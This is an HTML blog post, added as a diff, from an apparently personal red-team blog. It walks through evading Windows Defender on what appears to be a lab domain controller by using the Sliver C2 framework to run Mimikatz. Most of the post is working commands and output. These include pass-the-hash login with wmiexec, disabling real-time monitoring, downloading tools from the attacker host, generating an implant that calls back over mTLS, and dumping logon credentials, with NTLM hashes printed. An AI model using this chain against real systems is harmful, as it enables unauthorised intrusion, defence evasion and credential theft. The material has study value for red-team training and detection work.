@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Windows AV and Policy Evasion with Sliver as C2 Operator // byt3n33dl3</title>
+    <link rel="icon" type="image/png" href="../images/logo.png">
+    <link rel="stylesheet" href="../theme/css/pure.css">
+    <link rel="stylesheet" href="../theme/css/styles.css">
+    <link rel="stylesheet" href="../theme/css/pygments.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar pure-u">
+        <div class="cover-img"></div>
+        <div class="cover-body">
+            <header class="header">
+                <hgroup>
+                    <h1 class="brand-main"><a href="../index.html">AdverXarial</a></h1>
+                    <p class="tagline">Red Team // Adversary Emulator // Maintained by byt3n33dl3</p>
+                    <p class="links">
+                        <a href="../pages/about.html">About</a>
+                        <a href="https://byt3n33dl3.substack.com/">Archives</a>
+                    </p>
+                    <p class="social">
+                        <a href="https://github.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/github.svg" width="20" height="20" alt="GitHub">
+                        </a>
+                        <a href="#">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/linkedin.svg" width="20" height="20" alt="LinkedIn">
+                        </a>
+                        <a href="https://x.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/twitter.svg" width="20" height="20" alt="Twitter">
+                        </a>
+                    </p>
+                </hgroup>
+            </header>
+        </div>
+    </div>
+
+    <div class="pure-u">
+        <div class="content">
+            <div class="post-header">
+                <img src="../images/logo.png" alt="avatar" class="post-avatar">
+                <div class="post-meta-wrapper">
+                    <h2 class="post-author"><a href="../pages/byt3n33dl3.html">byt3n33dl3</a></h2>
+                    <p class="post-date">Published Wed 5 Jun 2024</p>
+                </div>
+            </div>
+
+            <p class="back-link"><a href="../index.html">← Home</a></p>
+
+            <article class="post-content">
+                <h1>Windows AV and Policy Evasion with Sliver as C2 Operator</h1>
+                <p class="post-tags">Tags: <a href="#">Red Teaming</a> · <a href="#">C2 Operations</a> · <a href="#">Sliver</a> · <a href="#">Windows Evasion</a></p>
+
+                <p class="post-meta">Blog released: 2024 Wed 5 Jun.</p>
+
+                <h1>Windows Evasion Overview</h1>
+
+                <p>PS yo, wanting to clarify that I'm not an expert, just a student and developer. I've mixed up various techniques from online sources and aim to share them with those who may be unfamiliar. While I've successfully executed the evasion, there's a possibility of inaccuracies in my statements.</p>
+
+                <p>To improve our evasion strategy, we should minimize disk involvement. What this means. Basically, we need to prevent any malicious data from interacting with the machine's disk.</p>
+
+                <div class="video-container">
+                <img alt="mimikatz-photo-fail" width="100%" src="../images/host-windows-defense-image.png"></iframe>
+                </div>
+                
+                <p>This blog are going to be practical!</p>
+
+                <p>Running <a href="https://hackviser.com/tactics/tools/mimikatz"><ins>Mimikatz from Sliver</ins></a> (attacker-side) are much reliable againts Windows AV than straight running the executable on the target machine.</p>
+
+                <p>Sliver implements a distributed architecture that clearly separates server, client, and operator components, allowing maximum operational flexibility:</p>
+
+                <pre><code class="language-plaintext">+---------------+       +----------------+       +------------------+
+| Sliver Server |<----->| Sliver Console |<----->| Sliver Implants  |
++---------------+       +----------------+       +------------------+
+     ^                                                   ^
+     |                                                   |
+     +---- Multiplexed C2 ----- Encrypted communication -+</code></pre>
+                
+                <h1>C2 Operation with <a href="https://bishopfox.com/tools/sliver/"><ins>Sliver</ins></a></h1>
+                
+                <p>As lil bit of explaination, C2 frameworks or Command and Control (C&C) infrastructure are used by security professionals e.g Red Teams, Pentester, ASR, etc to remotely control compromised machines during security assessments. They are also <ins>leveraged by Cybercrimes</ins> for the same reason.</p>
+
+                <p>Sliver C2 gets more and more traction from Threat Actors, often seen as an alternative from Cobalt Strike.</p>
+                
+                <p>One of the reason I like-em is because of the modular xtension package manager (armory) allowing easy install (automatic compilation) of various 3rd party tools such as BOFs and .NET tooling like Ghostpack Rubeus, Seatbelt, SharpUp, Certify, etc or even <a href="https://github.com/ParrotSec/mimikatz/"><ins>Mimikatz.</ins></a></p>
+                
+                <p>It's also have sweet kit for:</p>
+
+                <ul>
+                    <li>Screenshots</li>
+                    <li>Port-forwards</li>
+                </ul>
+
+                <p>And many more which I can't explain nor tell one by one.</p>
+
+                <h2>Attack Scenario Fails</h2>
+
+                <p>PS: This is an assumed breached.</p>
+
+                <p>Here I get Administrator shells via NTLM login from our Kali attack machine with wmiexec.py from impacket, and wanting to deploy my Mimikatz for post-exploitation reasons, etc.</p>
+                
+                <p>Logon:</p>
+
+                <pre><code class="language-bash">wmiexec.py administrator@multimaster.megacorp.local -hashes :69cbf4a9b7415c9e1caf93d51d971be0 -shell-type powershell
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> whoami
+megacorp\administrator</code></pre>
+
+                <p>Let's assume this is an enueration upon the Windows SYSTEM reading:</p>
+
+                <pre><code class="language-plaintext">PS C:\> systeminfo
+
+Host Name:                 MULTIMASTER
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00376-30821-30176-AA432
+Original Install Date:     9/25/2019, 10:57:13 AM
+System Boot Time:          1/22/2024, 10:28:43 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume3
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     4,095 MB
+Available Physical Memory: 2,161 MB
+Virtual Memory: Max Size:  4,799 MB
+Virtual Memory: Available: 2,500 MB
+Virtual Memory: In Use:    2,299 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    MEGACORP.LOCAL
+Logon Server:              N/A
+Hotfix(s):                 5 Hotfix(s) Installed.
+                           [01]: KB3199986
+                           [02]: KB4054590
+                           [03]: KB4512574
+                           [04]: KB4520724
+                           [05]: KB4530689
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.10.2
+                                 IP address(es)
+                                 [01]: 10.129.95.200
+                                 [02]: fe80::cc6d:7531:a3c5:2338
+                                 [03]: dead:beef::cc6d:7531:a3c5:2338
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+PS C:\> [System.Environment]::Is64BitOperatingSystem
+True</code></pre>
+
+                <pre><code class="language-plaintext">PS C:\users\administrator> net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            aldom                    alice                    
+alyx                     andrew                   ckane                    
+cyork                    dai                      DefaultAccount           
+Guest                    ilee                     james                    
+jorden                   jsmmons                  kpage                    
+krbtgt                   lana                     nbourne                  
+okent                    pmartin                  rmartin                  
+sbauer                   svc-nas                  svc-sql                  
+tushikikatomo            zac                      zpowers                  
+The command completed with one or more errors.</code></pre>
+
+                <p>Here I have transfer the x64 Mimikatz binary to targets and wanting it to run:</p>
+
+                <p>PS, turn-off AV:</p>
+
+                <pre><code class="language-powershell">Set-MpPreference -DisableRealtimeMonitoring $true</code></pre>
+
+                <pre><code class="language-plaintext">PS C:\users\administrator> Set-MpPreference -DisableRealtimeMonitoring $true
+                    
+PS C:\users\administrator> iwr -uri http://10.10.14.40/mimikatz.exe -outfile mimi.exe
+
+PS C:\users\administrator> dir
+
+
+    Directory: C:\users\administrator
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+d-----         1/9/2020   3:18 AM                .vscode                       
+d-r---         1/9/2020   2:45 PM                Contacts                      
+d-r---         1/9/2020   4:43 PM                Desktop                       
+d-r---         1/9/2020   4:35 PM                Documents                     
+d-r---         1/9/2020   2:45 PM                Downloads                     
+d-r---         1/9/2020   2:45 PM                Favorites                     
+d-r---         1/9/2020   2:45 PM                Links                         
+d-r---         1/9/2020   2:45 PM                Music                         
+d-r---         1/9/2020   2:45 PM                Pictures                      
+d-r---         1/9/2020   2:45 PM                Saved Games                   
+d-r---         1/9/2020   2:45 PM                Searches                      
+d-r---         1/9/2020   2:45 PM                Videos                        
+-a----        1/22/2024  10:39 PM        1250056 mimi.exe</code></pre>
+
+                <p>The real question, "is it going to run?"</p>
+
+                <div class="video-container">
+                <img alt="mimikatz-photo-fail" width="100%" src="../images/mimikatz-photo-fail-for-pe.jpeg"></iframe>
+                </div>
+
+                <p>And there we go, we fail:</p>
+
+                <p>With code results of:</p> 
+                
+                <p><code>"Error">because the file contains a virus or potentially unwanted softwareAt line:1</code></p>
+
+                <p>This Mimikatz are on production 2 years older than this machine, turns-out Windows can still detect a malicious processes.</p>
+
+                <h1>Attack Scenario Pwned!!</h1>
+
+                <p>In a big picture how we successfully gain Mimikatz to run are via the sliver frameworks attack kit, what we sould manage to deploy are the agent with binary that anables us to interact with the target SYSTEM, the trick here is when we build our agents nor beacons, whatever.</p>
+                
+                <h1>Sliver Set-Up</h1>
+
+                <p>I'm going to create the agent with Arch AMD64 and using MTLS for our Fellow:</p>
+                
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ sliver-server                
+[*] Loaded 22 aliases from disk
+[*] Loaded 151 extension(s) from disk
+
+          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
+        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
+        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
+          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
+        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
+        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
+        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
+        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
+                  ░      ░  ░ ░        ░     ░  ░   ░
+
+All hackers gain epic
+[*] Server v1.5.42 - kali
+[*] Welcome to the sliver shell, please type 'help' for options
+
+[*] Check for updates with the 'update' command
+
+[server] sliver > generate --mtls 10.10.14.40:9001 --os windows --arch amd64 --format exe --save /tmp/agent.exe
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 32s
+[*] Implant saved to /tmp/agent.exe
+
+[server] sliver > mtls --lhost 10.10.14.40 --lport 9001
+
+[*] Starting mTLS listener ...
+
+[*] Successfully started job #1</code></pre>
+
+                <p>That's it for set-up, now we just need to sent that <code>agent.exe</code> to the targets computer and run it, the access are now back at the wmiexec.py processes earlier.</p>
+
+                <p>Targets machine:</p>
+                
+                <pre><code class="language-plaintext">PS C:\programdata> Set-MpPreference -DisableRealtimeMonitoring $true
+
+PS C:\programdata> iwr -uri http://10.10.14.40/agent.exe -outfile agent.exe
+
+PS C:\programdata> dir
+
+
+    Directory: C:\programdata
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+d-----        7/16/2016   6:23 AM                Comms                         
+d---s-         1/9/2020   1:18 PM                Microsoft                     
+d-----        7/19/2021   1:07 AM                Package Cache                 
+d-----        9/25/2019  10:54 AM                regid.1991-06.com.microsoft   
+d-----        7/16/2016   6:23 AM                SoftwareDistribution          
+d-----       11/20/2016   5:15 PM                USOPrivate                    
+d-----       11/20/2016   5:15 PM                USOShared                     
+da----        7/19/2021   1:07 AM                VMware                        
+d-----         1/7/2020   7:45 PM                VsTelemetry                   
+-a----        1/22/2024  10:52 PM       15614976 agent.exe</code></pre>
+
+                <p>Done, we now just needed to activate it and wait for the beacons to came!</p>
+
+                <pre><code class="language-powershell">.\agent.exe</code></pre>
+
+                <p>Back to our Kali Attack machine, <ins>sliver manage to get the goods!</ins></p>
+
+                <pre><code class="language-plaintext">[*] Session 0ce336ed NATIONAL_CLIENT - 10.129.95.200:49843 (MULTIMASTER) - windows/amd64 - Fri, 23 Jan 2024 06:46:29 UTC
+
+[*] No beacons 🙁
+
+[server] sliver > sessions
+
+ ID         Transport   Remote Address        Hostname      Username                 Operating System   Health  
+========== =========== ===================== ============= ======================== ================== =========
+ 0ce336ed   mtls        10.129.95.200:49843   MULTIMASTER   MEGACORP\Administrator   windows/amd64      [ALIVE] 
+
+[server] sliver > use 0ce336ed
+
+[*] Active session NATIONAL_CLIENT (0ce336ed-107a-4751-996d-a0f2863d60f1)
+
+[server] sliver (NATIONAL_CLIENT) ></code></pre>
+
+                <p>Checking correct call-back:</p>
+
+                <pre><code class="language-plaintext">[server] sliver (NATIONAL_CLIENT) > whoami
+
+Logon ID: MEGACORP\Administrator
+[*] Current Token ID: MEGACORP\Administrator</code></pre>
+
+                <p>And test for Mimikatz in frameworks:</p>
+
+                <pre><code class="language-bash">[server] sliver (NATIONAL_CLIENT) > mimikatz
+
+[*] Successfully executed mimikatz
+[*] Got output:
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # C:\programdata\agent.exe
+ERROR mimikatz_doLocal ; "C:\programdata\agent.exe" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname</code></pre>
+
+                <p>It's a success, and we manage to get-em.</p>
+
+                <p>For higher-profit this is the commands.</p>
+
+                <pre><code class="language-bash">[server] sliver (NATIONAL_CLIENT) > mimikatz "token::elevate privilege::debug sekurlsa::logonpasswords exit"
+
+[*] Successfully executed mimikatz
+[*] Got output:
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+536     {0;000003e7} 1 D 32978          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;006648d1} 0 D 6846594     MEGACORP\Administrator  S-1-5-21-3167813660-1240564177-918740779-500(15g,26p)        Primary
+ * Thread Token  : {0;000003e7} 1 D 6955728     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 381094 (00000000:0005d0a6)
+Session           : Interactive from 1
+User Name         : cyork
+Domain            : MEGACORP
+Logon Server      : MULTIMASTER
+Logon Time        : 1/22/2024 10:29:55 PM
+SID               : S-1-5-21-3167813660-1240564177-918740779-3107
+        msv :
+         [00000003] Primary
+         * Username : cyork
+         * Domain   : MEGACORP
+         * NTLM     : 06327297532725a64e1edec0aad81cfe
+         * SHA1     : 56380d6f034d060faca78ae4dc90842bbfc5ffe1
+         * DPAPI    : 562c87ff69e458a64559c5a718700f43
+        tspkg :
+        wdigest :
+         * Username : cyork
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : cyork
+         * Domain   : MEGACORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 145404 (00000000:000237fc)
+Session           : Service from 0
+User Name         : MSSQLSERVER
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:29:19 PM
+SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 1a33fc88fa08d631779a310a53aa7deb
+         * SHA1     : 7b66dada748d8246c1972cfb5afeb45d11531aa6
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP.LOCAL
+         * Password : 6e 4f 77 d9 71 28 b9 a6 26 8b 59 aa b5 bf 6f 79 b4 af fe c0 c3 55 80 fd a3 d5 79 cd e0 51 d2 a7 32 60 10 cc 08 8e fe e3 17 d2 88 92 a3 6e a1 33 2a cb 33 99 6a b3 69 d0 25 dc 17 d0 64 aa 88 ed a9 f1 4d 23 3c 24 95 8d a3 95 34 ce 06 37 e2 12 5c 24 7a 0d 2c cb 85 51 04 0b 7b e9 6a df 1f c0 08 5b 48 7b 2f 95 3a 65 bf 94 7d f6 da ae e2 97 f7 6e b2 28 0b b7 fd 31 c0 51 58 0b 18 ee 11 7f 46 71 79 27 02 d8 7e b4 6f 45 98 e9 b5 44 67 c1 da b0 6d 49 41 5b 07 46 dc 60 40 4e cf f6 11 f9 0b 76 92 f9 40 9e f9 50 35 a5 af 0e 03 30 28 5e 25 62 fc b5 67 31 c7 eb c7 1e 96 4e 35 83 53 fe e1 e1 1a a5 88 d6 87 33 b0 48 22 5d bc d0 8c 7a 80 0f 6f a0 57 74 91 91 da a8 26 e6 ae a6 e7 6b d7 8b 54 1e 51 01 3a d9 54 e1 88 4c f9 53 de f8 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 69226 (00000000:00010e6a)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:53 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 1a33fc88fa08d631779a310a53aa7deb
+         * SHA1     : 7b66dada748d8246c1972cfb5afeb45d11531aa6
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP.LOCAL
+         * Password : 6e 4f 77 d9 71 28 b9 a6 26 8b 59 aa b5 bf 6f 79 b4 af fe c0 c3 55 80 fd a3 d5 79 cd e0 51 d2 a7 32 60 10 cc 08 8e fe e3 17 d2 88 92 a3 6e a1 33 2a cb 33 99 6a b3 69 d0 25 dc 17 d0 64 aa 88 ed a9 f1 4d 23 3c 24 95 8d a3 95 34 ce 06 37 e2 12 5c 24 7a 0d 2c cb 85 51 04 0b 7b e9 6a df 1f c0 08 5b 48 7b 2f 95 3a 65 bf 94 7d f6 da ae e2 97 f7 6e b2 28 0b b7 fd 31 c0 51 58 0b 18 ee 11 7f 46 71 79 27 02 d8 7e b4 6f 45 98 e9 b5 44 67 c1 da b0 6d 49 41 5b 07 46 dc 60 40 4e cf f6 11 f9 0b 76 92 f9 40 9e f9 50 35 a5 af 0e 03 30 28 5e 25 62 fc b5 67 31 c7 eb c7 1e 96 4e 35 83 53 fe e1 e1 1a a5 88 d6 87 33 b0 48 22 5d bc d0 8c 7a 80 0f 6f a0 57 74 91 91 da a8 26 e6 ae a6 e7 6b d7 8b 54 1e 51 01 3a d9 54 e1 88 4c f9 53 de f8 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : MULTIMASTER$
+Domain            : MEGACORP
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:52 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 1a33fc88fa08d631779a310a53aa7deb
+         * SHA1     : 7b66dada748d8246c1972cfb5afeb45d11531aa6
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : multimaster$
+         * Domain   : MEGACORP.LOCAL
+         * Password : 6e 4f 77 d9 71 28 b9 a6 26 8b 59 aa b5 bf 6f 79 b4 af fe c0 c3 55 80 fd a3 d5 79 cd e0 51 d2 a7 32 60 10 cc 08 8e fe e3 17 d2 88 92 a3 6e a1 33 2a cb 33 99 6a b3 69 d0 25 dc 17 d0 64 aa 88 ed a9 f1 4d 23 3c 24 95 8d a3 95 34 ce 06 37 e2 12 5c 24 7a 0d 2c cb 85 51 04 0b 7b e9 6a df 1f c0 08 5b 48 7b 2f 95 3a 65 bf 94 7d f6 da ae e2 97 f7 6e b2 28 0b b7 fd 31 c0 51 58 0b 18 ee 11 7f 46 71 79 27 02 d8 7e b4 6f 45 98 e9 b5 44 67 c1 da b0 6d 49 41 5b 07 46 dc 60 40 4e cf f6 11 f9 0b 76 92 f9 40 9e f9 50 35 a5 af 0e 03 30 28 5e 25 62 fc b5 67 31 c7 eb c7 1e 96 4e 35 83 53 fe e1 e1 1a a5 88 d6 87 33 b0 48 22 5d bc d0 8c 7a 80 0f 6f a0 57 74 91 91 da a8 26 e6 ae a6 e7 6b d7 8b 54 1e 51 01 3a d9 54 e1 88 4c f9 53 de f8 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 381075 (00000000:0005d093)
+Session           : Interactive from 1
+User Name         : cyork
+Domain            : MEGACORP
+Logon Server      : MULTIMASTER
+Logon Time        : 1/22/2024 10:29:55 PM
+SID               : S-1-5-21-3167813660-1240564177-918740779-3107
+        msv :
+         [00000003] Primary
+         * Username : cyork
+         * Domain   : MEGACORP
+         * NTLM     : 06327297532725a64e1edec0aad81cfe
+         * SHA1     : 56380d6f034d060faca78ae4dc90842bbfc5ffe1
+         * DPAPI    : 562c87ff69e458a64559c5a718700f43
+        tspkg :
+        wdigest :
+         * Username : cyork
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : cyork
+         * Domain   : MEGACORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:29:20 PM
+SID               : S-1-5-17
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 145363 (00000000:000237d3)
+Session           : Service from 0
+User Name         : SQLTELEMETRY
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:29:19 PM
+SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 1a33fc88fa08d631779a310a53aa7deb
+         * SHA1     : 7b66dada748d8246c1972cfb5afeb45d11531aa6
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP.LOCAL
+         * Password : 6e 4f 77 d9 71 28 b9 a6 26 8b 59 aa b5 bf 6f 79 b4 af fe c0 c3 55 80 fd a3 d5 79 cd e0 51 d2 a7 32 60 10 cc 08 8e fe e3 17 d2 88 92 a3 6e a1 33 2a cb 33 99 6a b3 69 d0 25 dc 17 d0 64 aa 88 ed a9 f1 4d 23 3c 24 95 8d a3 95 34 ce 06 37 e2 12 5c 24 7a 0d 2c cb 85 51 04 0b 7b e9 6a df 1f c0 08 5b 48 7b 2f 95 3a 65 bf 94 7d f6 da ae e2 97 f7 6e b2 28 0b b7 fd 31 c0 51 58 0b 18 ee 11 7f 46 71 79 27 02 d8 7e b4 6f 45 98 e9 b5 44 67 c1 da b0 6d 49 41 5b 07 46 dc 60 40 4e cf f6 11 f9 0b 76 92 f9 40 9e f9 50 35 a5 af 0e 03 30 28 5e 25 62 fc b5 67 31 c7 eb c7 1e 96 4e 35 83 53 fe e1 e1 1a a5 88 d6 87 33 b0 48 22 5d bc d0 8c 7a 80 0f 6f a0 57 74 91 91 da a8 26 e6 ae a6 e7 6b d7 8b 54 1e 51 01 3a d9 54 e1 88 4c f9 53 de f8 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:53 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 69747 (00000000:00011073)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:53 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 289fcbb2f2a91035588e3f090e0a5798
+         * SHA1     : 74600e570585ceda3ce2b5a6b692ee76c79affd9
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP.LOCAL
+         * Password : e3 46 5f c2 15 01 2a ad 9b 1f 7e 0b 37 00 19 bf 52 da 56 b1 c2 0b 5e 7d 00 74 2b 65 c3 4e e3 71 22 b1 4a 4e 9e 00 fd 6d 7a 46 73 80 fc 0b 8b 50 60 09 78 ac 3f 22 07 93 00 98 da 9d 62 c8 78 0b 6d 94 07 4d ec 27 d0 70 ac e5 e0 1c f6 07 19 d5 bd 83 fc 59 f2 b0 a0 89 48 28 64 f7 cd 0f 0e 60 b1 bf 81 2a 20 f4 9e 07 6a 5e e1 23 cd 26 13 c4 30 fe a3 60 e7 36 7a f1 21 fb 1d 41 56 33 2b 01 a1 80 e5 09 fe 8a 1f f6 00 d4 9d 00 09 64 ca d4 24 c0 4e a9 f7 00 58 f5 6e 01 cf 84 bf 9b 0b 24 0d fb 7b c9 1f 33 a2 1a bb c3 cd 4a f1 c7 07 67 53 55 94 39 f1 a5 e5 6b f6 60 c2 b3 d2 d1 88 fc f8 c6 eb 1e 86 20 17 2b 87 a1 95 10 fc bd 35 ea 2f ee 76 2a dc 2c 2e bd 31 1e e7 a5 a3 29 b9 4d 1c 6d d1 c3 83 03 1c 89 59 d0 47 a5 e2 88 31 13 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 38349 (00000000:000095cd)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:51 PM
+SID               : 
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 1a33fc88fa08d631779a310a53aa7deb
+         * SHA1     : 7b66dada748d8246c1972cfb5afeb45d11531aa6
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : MULTIMASTER$
+Domain            : MEGACORP
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:51 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : multimaster$
+         * Domain   : MEGACORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(commandline) # exit
+Bye!</code></pre>
+
+                <pre><code class="language-bash">[server] sliver (NATIONAL_CLIENT) > mimikatz sekurlsa::logonpasswords
+
+[*] Successfully executed mimikatz
+[*] Got output:
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
